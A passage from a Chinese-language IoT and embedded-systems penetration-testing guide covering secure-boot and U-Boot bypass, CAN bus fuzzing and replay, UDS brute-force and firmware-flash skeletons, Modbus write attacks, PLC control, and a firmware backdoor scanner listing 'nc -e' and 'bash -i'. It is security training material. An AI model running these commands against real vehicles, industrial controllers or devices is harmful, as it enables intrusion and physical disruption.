hackrf_transfer -r capture.iq -f 433920000 -s 8000000

# 信号重放
hackrf_transfer -t capture.iq -f 433920000 -s 8000000 -a 1 -x 47

# 使用 GNU Radio 构建复杂信号处理流程
# 配合 gr-lora, gr-ieee802-15-4 等模块
```

---

## 七、嵌入式系统安全 (Embedded System Security)

### 7.1 ARM TrustZone 绕过

ARM TrustZone 将系统分为安全世界 (Secure World) 和普通世界 (Normal World)。

```bash
# TrustZone 攻击面:
# - SMC (Secure Monitor Call) 调用接口漏洞
# - 安全世界内存损坏
# - 共享内存攻击
# - 侧信道攻击 (Cache/TLB)
# - 安全世界 TA (Trusted Application) 漏洞

# 使用 QEMU 模拟 TrustZone 环境
qemu-system-arm -M virt,secure=on -cpu cortex-a15 -m 256M \
    -bios bl1.bin \
    -device loader,file=tee-pager.bin,addr=0x0e000000

# 分析 OP-TEE (开源 TrustZone 实现)
# 提取 TA 进行逆向
```

```python
# trustzone_fuzzer.py - TrustZone SMC 接口模糊测试
import struct
import subprocess

def smc_fuzz():
    """模糊测试 TrustZone SMC 接口"""
    for func_id in range(0, 0xFFFF):
        for a1 in [0, 0xDEADBEEF, 0xFFFFFFFF, 0x41414141]:
            for a2 in [0, 0xCAFEBABE, 0xFFFFFFFF, 0x42424242]:
                # 调用 SMC 指令
                smc_call = struct.pack('<IIIIII',
                    func_id, a1, a2, 0, 0, 0)
                # 发送到设备并监控响应
                pass
```

### 7.2 安全启动 (Secure Boot) 绕过

```bash
# 安全启动绕过方法:
# 1. 签名验证逻辑漏洞
# 2. 版本回滚攻击
# 3. 内存损坏覆盖验证标志
# 4. 硬件故障注入 (电压/时钟/电磁)
# 5. eFuse/OTP 读取
# 6. 调试接口残留

# 分析 U-Boot 环境变量
# 在 U-Boot 控制台:
# > printenv
# > setenv bootdelay 5
# > setenv bootargs 'console=ttyS0,115200 single init=/bin/sh'
# > saveenv
# > boot

# 检查 U-Boot 版本漏洞
# U-Boot 已知漏洞数据库
# CVE-2022-30790 - U-Boot 网络栈溢出
# CVE-2022-33105 - U-Boot FDT 解析漏洞
```

### 7.3 TEE 攻击

TEE (Trusted Execution Environment) 是设备上的安全隔离区。

```bash
# TEE 攻击面:
# - TA (Trusted Application) 漏洞
# - TEE 内核 (Trusted OS) 漏洞
# - 共享内存攻击 (从 Normal World 攻击 Secure World)
# - 侧信道攻击 (从 Normal World 推断 Secure World 密钥)
# - 硬件调试接口 (如果 TEE 未正确禁用 JTAG)

# OP-TEE 分析
# 提取 TA UUID
ls /lib/optee_armtz/

# 逆向 TA
# TA 是 ELF 文件，使用 IDA Pro / Ghidra 分析
```

### 7.4 固件签名绕过

```bash
# 固件签名验证绕过技术:
# 1. 检查签名验证流程
#    - 使用 binwalk 提取固件
#    - 分析升级脚本 (通常在 /usr/sbin/ 或 /sbin/)
#    - 查找验证函数 (verify_signature, check_signature, validate_firmware)

# 2. 时间戳绕过
#    - 检查固件是否使用过期的证书
#    - 修改系统时间

# 3. 签名算法漏洞
#    - 弱签名算法 (MD5, SHA1)
#    - 密钥长度不足 (RSA-512)
#    - 没有签名验证 (仅校验 CRC32)

# 4. 二进制修补
#    - 修改验证函数返回值为 0 (成功)
#    - 在 Ghidra 中定位验证函数并修补

# 固件下载与验证流程分析
grep -rn "firmware\|update\|upgrade\|verify\|signature" /mnt/firmware/usr/sbin/ 2>/dev/null
strings /mnt/firmware/usr/sbin/upgrade | grep -i "sign\|verify\|check\|key"
```

### 7.5 U-Boot 漏洞利用

```bash
# U-Boot 常见攻击方法:

# 1. 中断自动启动进入 U-Boot Shell
#    在启动时按任意键中断自动启动

# 2. 从 U-Boot 读取内存
# > md 0x80000000 0x100       # 查看内存
# > mm 0x80000000              # 修改内存

# 3. 从 U-Boot 读取 Flash
# > sf probe 0
# > sf read 0x80000000 0x0 0x1000000
# > md 0x80000000 0x100

# 4. 修改启动参数
# > setenv bootargs 'console=ttyS0,115200 init=/bin/sh'
# > boot

# 5. 网络启动 (TFTP)
# > setenv serverip 192.168.1.100
# > tftp 0x80000000 rootfs.cpio
# > bootm 0x80000000

# 6. U-Boot 镜像提取
# 提取 U-Boot 环境变量存储区域
# 通常在 Flash 的固定偏移处
```

---

## 八、车联网安全 (Automotive Security)

### 8.1 CAN 总线攻击

CAN (Controller Area Network) 是车辆内部通信的核心协议。

```bash
# CAN 硬件连接
# 使用 CANable / USB2CAN / SocketCAN 接口

# 配置 CAN 接口
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0

# CAN 流量嗅探
candump can0

# CAN 消息发送
cansend can0 123#DEADBEEF

# 使用 can-utils 工具集
candump can0 -l                    # 记录到日志文件
canplayer -I candump.log           # 重放日志
cansniffer can0                    # 交互式 CAN 分析
cangen can0                        # 生成随机 CAN 帧

# 使用 caringcaribou 进行 CAN 安全测试
git clone https://github.com/CaringCaribou/caringcaribou.git
cd caringcaribou
python3 cc.py -i can0

# caringcaribou 模块:
# - discovery: 发现 CAN 节点
# - uds: UDS 诊断服务测试
# - fuzzer: CAN 帧模糊测试
# - dump: CAN 帧转储
# - send: 发送自定义 CAN 帧
# - test: 自动测试套件
```

```python
# can_fuzzer.py - CAN 总线模糊测试
import can
import time
import random

def can_fuzz(channel='can0', bitrate=500000):
    bus = can.interface.Bus(channel=channel, bustype='socketcan', bitrate=bitrate)

    # 模糊测试所有可能的 CAN ID
    for arb_id in range(0x000, 0x7FF):  # 标准 11-bit ID
        data = bytes([random.randint(0, 255) for _ in range(8)])
        msg = can.Message(arbitration_id=arb_id, data=data, is_extended_id=False)
        try:
            bus.send(msg)
            time.sleep(0.001)  # 1ms 间隔
        except can.CanError:
            pass

    bus.shutdown()

def can_replay(log_file):
    """重放 CAN 日志"""
    bus = can.interface.Bus(channel='can0', bustype='socketcan')
    with open(log_file, 'r') as f:
        for line in f:
            parts = line.strip().split()
            if len(parts) >= 3:
                arb_id = int(parts[1], 16)
                data = bytes.fromhex(parts[2].replace(' ', ''))
                msg = can.Message(arbitration_id=arb_id, data=data)
                bus.send(msg)
    bus.shutdown()
```

### 8.2 OBD-II 诊断

```bash
# OBD-II 连接
# 使用 ELM327 蓝牙/WiFi 适配器

# 使用 Python OBD 库
python3 << 'EOF'
import obd
connection = obd.OBD()
cmd = obd.commands.SPEED
response = connection.query(cmd)
print(f"Speed: {response.value}")
EOF

# 常见 OBD-II PID:
# 0x0C - RPM
# 0x0D - Speed
# 0x05 - Coolant Temp
# 0x0F - Intake Air Temp
# 0x11 - Throttle Position
```

### 8.3 UDS 诊断攻击

UDS (Unified Diagnostic Services) 是车辆 ECU 诊断标准 (ISO 14229)。

```bash
# UDS 服务 ID 枚举
# 0x10 - Diagnostic Session Control
# 0x11 - ECU Reset
# 0x14 - Clear Diagnostic Information
# 0x22 - Read Data By Identifier
# 0x27 - Security Access (密钥交换)
# 0x2E - Write Data By Identifier
# 0x31 - Routine Control
# 0x34 - Request Download
# 0x35 - Request Upload
# 0x36 - Transfer Data
# 0x37 - Request Transfer Exit
# 0x3E - Tester Present

# 使用 uds-python 库进行 UDS 测试
```

```python
# uds_security_test.py
import uds
from uds import Uds

# UDS 安全访问暴力破解
def brute_force_security_access(ecu_id, level=0x01):
    """暴力破解 UDS Security Access 密钥"""
    for seed in range(0, 0xFFFF):
        # 计算密钥 (常见算法: seed XOR 0x1234)
        key = seed ^ 0x1234
        # 发送 Security Access 请求
        pass

# 固件刷写攻击
def unauthorized_firmware_flash():
    """通过 UDS 服务刷写未授权固件"""
    # 1. 切换到编程会话 (0x10 02)
    # 2. 执行 Security Access (0x27)
    # 3. 发送 Request Download (0x34)
    # 4. 发送 Transfer Data (0x36)
    # 5. 发送 Request Transfer Exit (0x37)
    # 6. 执行 Routine Control 验证固件 (0x31)
    pass
```

### 8.4 ECU 逆向

```bash
# ECU 固件提取
# 1. 通过 JTAG/SWD 读取 MCU Flash
# 2. 通过 UDS 0x23 (Read Memory By Address) 读取
# 3. 拆解 ECU，通过 SPI 读取外部 Flash

# ECU 固件分析
# 使用 Ghidra 加载 ECU 固件 (通常为 Tricore/ARM/PowerPC 架构)
# 分析 CAN 消息处理函数
# 分析 UDS 请求处理函数
# 分析密钥计算算法

# Tricore 架构逆向 (常见于汽车 ECU)
# Ghidra 插件: ghidra_tricore
```

### 8.5 V2X 通信安全

V2X (Vehicle-to-Everything) 包括 V2V, V2I, V2P, V2N。

```bash
# V2X 通信协议:
# - DSRC (Dedicated Short-Range Communications) - 基于 IEEE 802.11p
# - C-V2X (Cellular V2X) - 基于 4G LTE/5G NR

# V2X 攻击面:
# - 虚假 BSM (Basic Safety Message) 注入
# - 证书撤销列表 (CRL) 绕过
# - 位置欺骗
# - 隐私标识符 (Pseudonym) 追踪
# - V2X PKI 攻击
```

---

## 九、工业控制系统安全 (ICS/SCADA)

### 9.1 Modbus 协议安全

Modbus 是工业自动化最广泛使用的协议之一。

```bash
# Modbus 设备发现
nmap -p 502 --script modbus-discover 192.168.1.0/24

# 使用 modbus-cli 读取寄存器
modbus read 192.168.1.100 0x01 0 10    # 读取线圈
modbus read 192.168.1.100 0x02 0 10    # 读取离散输入
modbus read 192.168.1.100 0x03 0 10    # 读取保持寄存器
modbus read 192.168.1.100 0x04 0 10    # 读取输入寄存器

# 写入操作
modbus write 192.168.1.100 0x05 0 1    # 写入单个线圈
modbus write 192.168.1.100 0x06 0 100  # 写入单个寄存器
```

```python
# modbus_security_test.py
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ConnectionException

def modbus_discovery(ip_range):
    """扫描 Modbus 设备"""
    for ip in ip_range:
        try:
            client = ModbusTcpClient(ip, port=502, timeout=2)
            if client.connect():
                print(f"[+] Modbus device found: {ip}:502")
                # 读取设备标识
                result = client.read_holding_registers(0, 10)
                if not result.isError():
                    print(f"    Registers: {result.registers}")
                client.close()
        except:
            pass

def modbus_write_attack(ip, port=502):
    """Modbus 写入攻击测试"""
    client = ModbusTcpClient(ip, port=port)
    client.connect()
    # 尝试写入线圈 (可能导致设备动作)
    client.write_coil(0, True)     # 打开线圈 0
    client.write_coil(1, False)    # 关闭线圈 1
    # 尝试写入寄存器 (可能修改运行参数)
    client.write_register(0, 0)    # 清零寄存器 0
    client.close()
```

### 9.2 DNP3 协议安全

DNP3 (Distributed Network Protocol) 广泛用于电力、水务 SCADA 系统。

```bash
# DNP3 扫描
nmap -p 20000 --script dnp3 192.168.1.0/24

# 使用 opendnp3 进行 DNP3 安全测试
```

### 9.3 OPC UA 安全

OPC UA (Unified Architecture) 是工业 4.0 的核心通信协议。

```bash
# OPC UA 发现
nmap -p 4840 --script opcua-discovery 192.168.1.0/24

# 使用 opcua-client 连接
opcua-client opc.tcp://192.168.1.100:4840

# OPC UA 安全测试要点:
# - 匿名访问测试
# - 证书验证绕过
# - 用户认证绕过
# - 命名空间遍历
# - 订阅滥用
```

```python
# opcua_security_test.py
from opcua import Client

def opcua_anonymous_test(url):
    """测试 OPC UA 匿名访问"""
    client = Client(url)
    try:
        client.connect()
        print(f"[+] Anonymous connection successful to {url}")
        # 枚举根节点
        root = client.get_root_node()
        print(f"    Root: {root}")
        # 遍历命名空间
        for i in range(10):
            try:
                node = client.get_node(f"ns={i};i=85")
                children = node.get_children()
                for child in children:
                    print(f"    Node: {child}")
            except:
                pass
        client.disconnect()
    except Exception as e:
        print(f"[-] Connection failed: {e}")
```

### 9.4 PLC 攻击

```bash
# PLC 攻击面:
# - 逻辑修改 (下载恶意梯形图程序)
# - 固件替换
# - 内存读写
# - I/O 强制
# - 停止/启动操作

# 西门子 S7 协议攻击
# 使用 s7scan 等工具

# 使用 Snap7 库进行 S7 通信
python3 << 'EOF'
import snap7
client = snap7.client.Client()
client.connect('192.168.1.100', 0, 1)
# 读取 CPU 状态
state = client.get_cpu_state()
print(f"CPU State: {state}")
# 停止 CPU (危险操作!)
# client.plc_stop()
# 启动 CPU
# client.plc_cold_start()
client.disconnect()
EOF
```

---

## 十、实战案例与完整工具链

### 10.1 完整 IoT 渗透测试流程

```bash
# === 阶段 1: 侦察与信息收集 ===
# 1. 设备型号识别
# 2. FCC ID 查询 (fccid.io)
# 3. 厂商文档收集
# 4. 固件下载

# === 阶段 2: 硬件分析 ===
# 1. 拆解设备
# 2. PCB 拍照与分析
# 3. 芯片丝印查询
# 4. UART/JTAG/SWD 接口发现
# 5. 逻辑分析仪捕获通信

# === 阶段 3: 固件分析 ===
# 1. binwalk 解包
# 2. 文件系统分析
# 3. 硬编码凭据提取
# 4. 后门检测
# 5. 二进制逆向

# === 阶段 4: 通信协议分析 ===
# 1. MQTT/CoAP 流量抓取
# 2. BLE/ZigBee 嗅探
# 3. 协议逆向
# 4. 重放攻击测试

# === 阶段 5: 移动端/云平台测试 ===
# 1. App 逆向
# 2. API 模糊测试
# 3. 云平台横向移动
# 4. MQTT Broker 测试

# === 阶段 6: 漏洞利用 ===
# 1. 组合利用发现的漏洞
# 2. 编写 Exploit
# 3. 获取设备 Shell
# 4. 持久化

# === 阶段 7: 报告 ===
# 1. 漏洞整理
# 2. 风险评级
# 3. 修复建议
# 4. 报告撰写
```

### 10.2 综合工具链

```bash
# 一键部署 IoT 安全测试环境
# 安装核心工具集

# 固件分析工具
sudo apt install -y binwalk squashfs-tools cabextract \
    lzma lzop zstd gzip bzip2 xz-utils arj lhasa \
    cpio p7zip-full unrar-free

# 硬件调试工具
sudo apt install -y minicom picocom screen \
    openocd flashrom sigrok pulseview

# 协议分析工具
sudo apt install -y mosquitto-clients mqtt-explorer \
    nmap wireshark tcpdump

# 逆向工程工具
sudo apt install -y ghidra radare2 cutter

# Python 工具
pip install unblob pymodbus paho-mqtt aiocoap \
    bluepy can-utils python-can uds

# 克隆关键开源工具
mkdir -p ~/iot-tools
cd ~/iot-tools

# firmwalker
git clone https://github.com/craigz28/firmwalker.git

# FACT
git clone https://github.com/fkie-cad/FACT_core.git

# EMBA
git clone https://github.com/e-m-b-a/emba.git

# OFRAK
git clone https://github.com/redballoonsecurity/ofrak.git

# caringcaribou (CAN 安全)
git clone https://github.com/CaringCaribou/caringcaribou.git

# KillerBee (ZigBee)
git clone https://github.com/riverloopsec/killerbee.git

# Proxmark3
git clone https://github.com/RfidResearchGroup/proxmark3.git
```

### 10.3 综合自动化脚本

```python
#!/usr/bin/env python3
"""
iot_basic_scan.py - IoT 设备基础安全扫描器
自动扫描固件中的常见安全问题
"""

import os
import sys
import re
import subprocess
import json
from pathlib import Path

class IoTFirmwareScanner:
    def __init__(self, firmware_path):
        self.firmware_path = firmware_path
        self.results = {
            "credentials": [],
            "certificates": [],
            "backdoors": [],
            "database_files": [],
            "network_configs": [],
            "shadow_files": [],
            "ssh_keys": [],
            "api_keys": [],
            "private_keys": [],
            "suspicious_binaries": [],
            "startup_scripts": []
        }

    def scan_credentials(self):
        """扫描硬编码凭据"""
        patterns = [
            r'password\s*=\s*["\']([^"\']+)["\']',
            r'passwd\s*=\s*["\']([^"\']+)["\']',
            r'secret\s*=\s*["\']([^"\']+)["\']',
            r'api_key\s*=\s*["\']([^"\']+)["\']',
            r'token\s*=\s*["\']([^"\']+)["\']',
            r'jdbc:.*://([^/]+)/([^?]+)\?user=([^&]+)&password=([^&\s]+)',
        ]
        for root, dirs, files in os.walk(self.firmware_path):
            for f in files:
                filepath = os.path.join(root, f)
                try:
                    with open(filepath, 'rb') as fh:
                        content = fh.read()
                        for pattern in patterns:
                            matches = re.findall(pattern.encode(), content)
                            for match in matches:
                                self.results["credentials"].append({
                                    "file": filepath,
                                    "match": str(match[:100])
                                })
                except (IOError, PermissionError):
                    pass

    def scan_certificates(self):
        """扫描证书文件"""
        cert_exts = ['.crt', '.pem', '.p12', '.pfx', '.jks', '.keystore',
                     '.cer', '.der', '.csr', '.key']
        for root, dirs, files in os.walk(self.firmware_path):
            for f in files:
                for ext in cert_exts:
                    if f.endswith(ext):
                        self.results["certificates"].append(
                            os.path.join(root, f))

    def scan_backdoors(self):
        """检测后门特征"""
        backdoor_patterns = [
            b'telnetd',
            b'dropbear',
            b'/bin/sh',
            b'nc -e',
            b'bash -i',
            b'python -c',
            b'backdoor',
            b'debug_mode',
            b'super_secret'
        ]
        for root, dirs, files in os.walk(self.firmware_path):
            for f in files:
                filepath = os.path.join(root, f)
                try:
                    with open(filepath, 'rb') as fh:
                        content = fh.read()
                        for pattern in backdoor_patterns:
                            if pattern in content:
                                self.results["backdoors"].append({
                                    "file": filepath,
                                    "pattern": pattern.decode()
                                })
                                break
                except (IOError, PermissionError):
                    pass

    def generate_report(self):
        """生成扫描报告"""
        report = f"""
========================================
IoT Firmware Security Scan Report
========================================
Firmware: {self.firmware_path}

[Credentials Found] ({len(self.results['credentials'])})
"""
        for cred in self.results['credentials'][:20]:
            report += f"  - {cred['file']}: {cred['match']}\n"

        report += f"\n[Certificates] ({len(self.results['certificates'])})\n"
        for cert in self.results['certificates'][:20]:
            report += f"  - {cert}\n"

        report += f"\n[Backdoor Indicators] ({len(self.results['backdoors'])})\n"
        for bd in self.results['backdoors'][:20]:
            report += f"  - {bd['file']}: {bd['pattern']}\n"

        return report

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 iot_basic_scan.py <firmware_extracted_dir>")
        sys.exit(1)

    scanner = IoTFirmwareScanner(sys.argv[1])
    scanner.scan_credentials()
    scanner.scan_certificates()
    scanner.scan_backdoors()
    print(scanner.generate_report())
```

### 10.4 应急响应与安全加固

```bash
# IoT 设备安全加固 Checklist
# 1. 固件安全
#    - 启用安全启动 (Secure Boot)
#    - 固件签名验证
#    - 回滚保护
#    - 加密固件存储

# 2. 硬件安全
#    - 禁用不必要的调试接口 (JTAG/SWD/UART)
#    - 启用 RDP (Readout Protection)
#    - 熔断 eFuse 安全位
#    - 使用安全元件 (SE/TPM)

# 3. 通信安全
#    - MQTT 启用 TLS 1.3
#    - 使用客户端证书认证
#    - Topic ACL 限制
#    - BLE 使用 LESC (LE Secure Connections)

# 4. 云平台安全
#    - API 认证与授权
#    - 设备身份验证 (X.509 证书)
#    - 速率限制
#    - 异常检测

# 5. 密钥管理
#    - 使用安全存储 (Secure Element / TEE)
#    - 设备唯一密钥 (Per-device key)
#    - 密钥轮换机制
#    - 禁止硬编码密钥
```

---

## 附录 A: 参考资源

### 社区与工具
- OWASP IoT Top 10: https://owasp.org/www-project-internet-of-things/
- IoT Security Foundation: https://www.iotsecurityfoundation.org/
- CSA IoT Security Controls Framework
- ENISA IoT Security Guidelines
- NIST IR 8259 IoT Cybersecurity

### 硬件参考
- 芯片手册: https://www.alldatasheet.com/
- SMD 代码: https://smd.yooneed.one/
- FCC ID: https://fccid.io/

### 培训与认证
- Hardware Hacking Workshop (Joe Grand)
- Practical IoT Hacking (Attify)
- Offensive IoT Exploitation (Attify)
- SANS SEC556: IoT Penetration Testing

---

## 附录 B: 2026 年 IoT 安全趋势

1. **Matter 协议大规模部署**: 统一智能家居标准带来新的攻击面
2. **AIoT 安全**: AI 模型在设备端的部署引发模型窃取/投毒风险
3. **5G IoT 规模化**: mMTC 场景下的设备群安全挑战
4. **边缘计算安全**: 边缘节点成为新的攻击入口
5. **供应链安全**: IoT 设备供应链攻击日益增多
6. **量子计算威胁**: 后量子密码学 (PQC) 在 IoT 中的应用
7. **监管合规**: 欧盟 Cyber Resilience Act, 美国 IoT Cybersecurity Improvement Act
8. **数字孪生安全**: 工业数字孪生系统的安全风险